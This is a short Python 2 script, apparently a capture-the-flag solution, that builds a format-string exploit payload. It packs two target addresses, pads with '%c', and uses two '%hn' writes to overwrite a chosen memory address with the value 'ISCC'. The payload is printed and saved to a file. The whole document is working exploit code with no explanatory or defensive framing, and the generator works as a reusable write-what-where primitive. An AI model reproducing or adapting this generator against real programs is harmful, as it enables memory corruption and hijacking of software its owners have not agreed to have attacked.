#!/usr/bin/env python
import struct


def L32(val) : return struct.pack('<I',val)
def UL32(str): return struct.unpack('<I',str)[0]

def SaveAsFile(filename,str):
	fd = open(filename,'wb')
	fd.write(str)
	fd.close()


def Gen_VS_Format(format_off, targetaddr, value):
	'''
		makeformat: overwrite targetaddr with value  (format overwrite vulns for VS)
	'''
	format=''
	junk = 0x08080808

	low_addr = targetaddr
	high_addr = targetaddr+2
	
	low_value  = value & 0x0000FFFF
	high_value = (value >>16) & 0x0000FFFF

	format_off = int(format_off/4)

	if low_value > high_value:
		_high_value = high_value - 4 - 4 - 4 - 4 - format_off
		_low_value  = low_value - high_value
		format += L32(junk) + L32(high_addr) + L32(junk) + L32(low_addr) + '%c'*format_off + '%' +str(_high_value) + 'c%hn' + '%' +str(_low_value) + 'c%hn'
	else:
		_low_value   = low_value - 4 - 4 - 4 - 4 - format_off
		_high_value  = high_value - low_value 
		format += L32(junk) + L32(high_addr) + L32(junk) + L32(low_addr) + '%c'*format_off + '%' +str(_low_value) + 'c%hn' + '%' +str(_high_value) + 'c%hn'

	return format


if __name__ == '__main__':

	WRON_ADDR = 0x0109D008		#WRON_ADDR is the target address to overwrite,it depeneds on you system!
	FORMAT_OFF = 208			
	VALUE = UL32('ISCC')
	FORMAT =  Gen_VS_Format(FORMAT_OFF,WRON_ADDR,VALUE)
	print FORMAT
	SaveAsFile('binfile', FORMAT)
